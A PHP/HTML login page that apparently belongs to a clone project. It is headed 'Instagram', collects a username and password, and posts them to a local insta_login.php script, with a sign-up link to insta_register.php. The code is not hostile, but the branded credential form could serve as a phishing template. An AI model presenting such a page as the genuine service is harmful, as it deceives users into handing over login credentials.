<?php include('twitter_server.php') ?>
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 40px;
            background-color: white;
            border: 1px solid #e6e6e6;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #ff69b4; /* Pink color */
            font-size: 36px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #e6e6e6;
            border-radius: 5px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #357ae8;
        }
        .message {
            text-align: center;
            color: #999;
        }
        .message a {
            color: #3897f0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <h2>Login</h2>
        
        <form method="post" action="insta_login.php">
        <?php include('errors.php'); ?>
            <input type="text" placeholder="username" name="user" required>
            <input type="password" placeholder="Password" name="password" required>
            <input type="submit" value="Log in" name='login_user'>
        </form>
        <p class="message">Don't have an account? <a href="insta_register.php">Sign up</a></p>
    </div>
</body>
</html>
